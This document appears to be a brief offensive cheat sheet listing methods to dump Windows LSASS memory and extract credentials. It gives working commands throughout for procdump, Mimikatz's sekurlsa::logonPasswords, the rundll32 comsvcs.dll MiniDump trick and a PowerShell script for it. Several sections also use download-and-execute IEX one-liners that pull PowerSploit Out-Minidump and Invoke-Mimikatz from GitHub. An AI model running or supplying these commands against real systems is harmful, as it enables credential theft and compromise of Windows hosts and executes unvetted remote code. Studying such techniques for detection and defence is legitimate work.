# Methods to Dump LSASS
Craft a comprehensive guide detailing various methods for dumping the LSASS.<br>
I think This will be a valuable one and will make people stay updated on new techniques.
## 1. Procdump:
Procdump is a part of Microsoft Sysinternals and a command-line<br>utility programs for producing dumps of any running process<br>
We can leverage it and use it fo DUMP lsass process by the following:<br>
<code>procdump.exe -ma lsass.exe C:\path\lsass.dmp</code>

## 2. Mimikatz:
Mimikatz can both dump the LSASS process and read from an LSASS dump:<br>
<code>privilege::debug = Debugging Mode
sekurlsa::logonPasswords = Dump passwords
</code>

* To Read from an LSASS dump:<br>
<code>sekurlsa::minidump C:\path\lsass.dmp
sekurlsa::logonpasswords</code>

## 3. Rundll32
This is a native Windows utility method which can we can use:<br>
<code>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_Process_ID> C:\path</code><br>
for getting lsass process ID, you can RUN "Get-Process lsass" on powershell.
* User can also done this by making a PS script containing the following:<br>
<code>$lsass = Get-Process lsass
$dumpPath = "C:\Users\Adwin2\Desktop\lsass.dmp"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full</code><br><br>
<b>Note</b>: Change $dumpPath

## 4. PowerSploit's Out-Minidump:
Ensure the Out-Minidump function is loaded in your PowerShell session<br>
<code>IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1')"
Get-Process lsass | Out-Minidump -DumpFilePath C:\Path\To\Dump
</code>

#### 4.4 - Using 'MiniDump' to dump lsass into C:\Windows\Tasks:
<code>
IEX (New-Object Net.WebClient).DownloadString('https://github.com/chvancooten/OSEP-Code-Snippets/raw/main/MiniDump/MiniDump.ps1')
Reults will be save on C:\Windows\Tasks.
</code>

##  5. Using Invoke-Mimikatz from the GitHub Repository:
Download & Import the Script:
First, you need to get the Invoke-Mimikatz.ps1 script from the GitHub repository.
If you're working directly on the machine:
<code>IEX (New-Object Net.WebClient).DownloadString('https://github.com/g4uss47/Invoke-Mimikatz/raw/master/Invoke-Mimikatz.ps1')</code><br>

Invoke Mimikatz to Dump LSASS:<br>
Once the module is imported, you can run Invoke-Mimikatz to dump the LSASS</br>

<code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords"'</code><br>
* You can also using minidump module to select where to read:<br>
<code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::minidump C:\Path\To\Load\Lsass"'</code>
